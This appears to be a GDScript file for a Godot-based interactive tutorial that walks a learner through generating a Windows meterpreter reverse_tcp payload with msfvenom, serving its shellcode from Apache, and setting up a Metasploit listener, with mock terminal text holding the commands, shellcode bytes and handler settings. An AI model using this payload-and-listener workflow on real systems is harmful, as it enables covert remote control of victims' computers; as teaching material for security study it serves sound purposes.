extends MarginContainer

@onready var code_edit: CodeEdit = $HSplitContainer/CodeEdit
@onready var overlay: ColorRect = $HSplitContainer/CodeEdit/Overlay
@onready var desktop: MarginContainer = $"../Margin"
@onready var fileless: MarginContainer = $"."
@onready var rich_text_label: RichTextLabel = $HSplitContainer/HFlowContainer/RichTextLabel

var step: int = 0

	
func _ready() -> void:
	overlay.visible = false
	_update_shader(Vector2(0.115, 0.045), Vector2(3.3, 0.47))


func _on_back_button_down() -> void:
	# TODO: Set limits on back and next
	if step >= 1:
		step -= 1
		set_step(step)

func _on_next_button_down() -> void:
	step += 1
	set_step(step)
	
func _update_shader(pos: Vector2, size: Vector2) -> void:
	if overlay.material is ShaderMaterial:
		var shader_mat := overlay.material as ShaderMaterial
		shader_mat.set_shader_parameter("hole_position", pos)
		shader_mat.set_shader_parameter("hole_size", size) 	

func set_step(step: int) -> void:
	match step:
		#Stsrt or MSFVENOM Start
		1:
			rich_text_label.text = "This command is asking Metasploit’s payload maker (msfvenom) to create a special program for Windows that will secretly call back to my computer’s IP and port "
			overlay.visible = true
		2:
			_update_shader(Vector2(0.115, 0.67), Vector2(3.3, 0.34))
			rich_text_label.text = " You didn’t type --platform windows, but because your payload (windows/meterpreter/reverse_tcp) is clearly for Windows, msfvenom guessed and set it to Windows automatically."
		3:
			_update_shader(Vector2(0.115, .99), Vector2(3.3, 0.34))
			rich_text_label.text = "You didn’t type --arch x86, but your chosen payload works on 32-bit (x86) systems, so msfvenom picked that for you."
		4:
			rich_text_label.text = "Payload created, now let's host it in apache. CLEAR the terminal"
			_update_shader(Vector2(0.115, 1.32), Vector2(3.3, 0.46))
		#APACHE
		5:
			change_text_apache()
			overlay.visible = false
			rich_text_label.text = "Now we need to host the payload shellcode so the computer can download it."
		6:
			overlay.visible = true
			_update_shader(Vector2(0.115, 0.045), Vector2(3.3, 0.17))
			rich_text_label.text = "This line copies the shellcode.txt file (your payload in C array format) into Apache’s public HTML folder."
		7:
			_update_shader(Vector2(0.115, 0.19), Vector2(3.3, 0.17))
			rich_text_label.text = "This line starts the Apache web server so the file can be served over HTTP."
		8:
			_update_shader(Vector2(0.115, 0.35), Vector2(3.3, 0.17))
			rich_text_label.text = "Requests the file via HTTP from your Apache server’s IP address. \n\n If it outputs the full unsigned char buf[] = ... shellcode, then the hosting is working."
		9:
			_update_shader(Vector2(0.115, 0.51), Vector2(3.3, 1.94))
			rich_text_label.text = "Look like it's working"
		10:
			_update_shader(Vector2(0.115, 2.44), Vector2(3.3, 0.17))
			rich_text_label.text = "Now run CLEAR and let's setup the listener in Metasploit"
		#METASPLOIT
		11:
			change_text_metasploit()
			_update_shader(Vector2(0.115, 0.045), Vector2(3.3, 0.17))
			rich_text_label.text = "Now let's create the listener in metasploit \n\n This module doesn’t exploit anything — it just waits (listens) for a payload to connect back. \n\n Perfect for catching a reverse_tcp payload you made with msfvenom.
"
		12:
			_update_shader(Vector2(0.115, 0.19), Vector2(3.5, 0.33))
			rich_text_label.text = "Matches the payload type you generated earlier — this is critical. \n\n If the payload you made in msfvenom is windows/meterpreter/reverse_tcp, this must be the same here."
		13:
			_update_shader(Vector2(0.115, 0.51), Vector2(3.3, 0.33))
			rich_text_label.text = "This should be the IP address of your attacking machine on the same network as the target. \n\n Must match the LHOST you used in msfvenom."
		14:
			_update_shader(Vector2(0.115, 0.83), Vector2(3.3, 0.33))
			rich_text_label.text = "Same as above — this needs to match the LPORT from your generated payload."
		15:
			_update_shader(Vector2(0.115, 1.16), Vector2(3.3, 2.35))
			rich_text_label.text = "Shows all the required settings. \n\n You’ve set LHOST and LPORT, and EXITFUNC has a default (process), so you’re ready to run. \n\n Let's now create the boilerplate \n\n Let's close the terminal and open VSCODE"
		16:
			fileless.visible = false
			desktop.visible = true
			
func change_text_apache():
	code_edit.text = """root@cali :~ # sudo cp shellcode.txt /var/www/html/
root@cali :~ # sudo service apache2 start
root@cali :~ # curl http://192.168.x.x/shellcode.txt
unsigned char buf[] = "
\\x33\\xc9\\x83\\xee\\x9a\\x7e\\xe8\\xff\\xff\\xff\\xfc\\xc0\\x5e\\x81\\x76
\\x0e\\xeb\\x73\\x82\\x43\\x83\\xee\\xfc\\x2e\\x4f\\x41\\x17\\x9b\\x0d\\x43
\\xeb\\x73\\x82\\x72\\x39\\xfa\\x67\\x27\\x60\\x21\\xbc\\x8c\\xb9\\x0d\\x43
\\x09\\x11\\xff\\xf8\\xf0\\x6b\\xda\\x8c\\xd4\\x41\\x55\\x3b\\x03\\x47\\x41
\\xfe\\x39\\x35\\xee\\x9a\\x7e\\x82\\x43\\x82\\x24\\x7f\\xa4\\x03\\xbc\\xf3
\\xbc\\x11\\xbc\\xff\\x0d\\x53\\x60\\x31\\xbe\\x43\\xbc\\xff\\xc3\\xfc\\x3b
\\x6e\\xb3\\x6f\\x0f\\xea\\xa3\\x0b\\x2b\\x1f\\xf3\\xda\\x3a\\xea\\xa0\\x47
\\x2b\\x2b\\x40\\x40\\x47\\x72\\x45\\x7b\\x0b\\x60\\x76\\x40\\x91\\x46\\x03
\\xbb\\x9a\\xf6\\x06\\x62\\x12\\x0c\\x2b\\x47\\x64\\x27\\x45\\x2a\\x3a\\x0b
\\xeb\\x73\\x82\\x4c\\x47\\x41\\xc3\\xbc\\xfd\\x0f\\xda\\x12\\xca\\x44\\x57
\\xea\\xf3\\x7d\\x0b\\xd9\\x9a\\x5e\\x27\\x91\\x62\\x09\\x44\\x47\\x52\\xca"
root@cali:- # clear"""

func change_text_metasploit():
	code_edit.text = "msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf6 exploit(multi/handler) >  set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler)

		  Name         Current Setting      Required       Description

Payload options (windows/meterpreter/reverse_tcp)

		  Name         Current Setting      Required       Description

		  EXITFUNC  process                     yes         Exit technique (Accepted: ' ', 
																				 seh, thr, ead, process, none)
		  LHOST       192.168.29.208         yes         The listen address (an 
																				 interface maybe specified)
		  LPORT       8000                           yes         The listen port "
